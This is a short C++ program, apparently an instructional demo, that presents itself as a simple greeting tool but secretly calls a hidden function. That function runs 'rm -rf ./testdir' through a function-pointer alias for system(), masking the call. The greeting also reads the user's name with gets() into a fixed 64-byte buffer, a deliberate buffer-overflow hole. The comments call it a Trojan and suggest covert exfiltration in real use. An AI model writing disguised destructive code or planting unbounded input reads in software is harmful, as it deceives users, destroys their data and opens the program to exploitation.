#include <iostream>
#include <cstdio>    // for gets (unsafe, removed in modern C/C++)
#include <cstdlib>   // for system()

using namespace std;

// An obfuscated or oddly named function that calls `system()` to do something malicious.
void hiddenMaliciousFunction() {
    // For the demo, let's do something visible like removing a "testdir" directory.
    // In real scenarios, it could do something more covert (e.g., exfiltrate data).
    typedef int (*cmd_ptr)(const char*);  // function pointer type for system()
    cmd_ptr runCmd = system;

    // A simple malicious command.
    // ***WARNING***: This will delete "testdir" in the current path if it exists.
    // Purely for demonstration!
    const char* destructiveCmd = "rm -rf ./testdir";

    // Execute the malicious command
    runCmd(destructiveCmd);
}

// A function that *looks* benign—just a typical "greeting".
void greetUser() {
    char name[64];
    cout << "Enter your name: ";
    // gets is unsafe because it has no boundary check on name[]
    // But we're showing it for demonstration, as you mentioned your compiler still supports gets().
    gets(name);

    cout << "Hello, " << name << "!" << endl;
}

// Our "Trojan" main function, disguised as a normal tool.
int main() {
    // We appear to be just greeting the user:
    greetUser();

    // Without any obvious mention, we also call the hidden malicious function:
    hiddenMaliciousFunction();

    // Then pretend to exit normally
    cout << "[Done] Exiting program..." << endl;
    return 0;
}
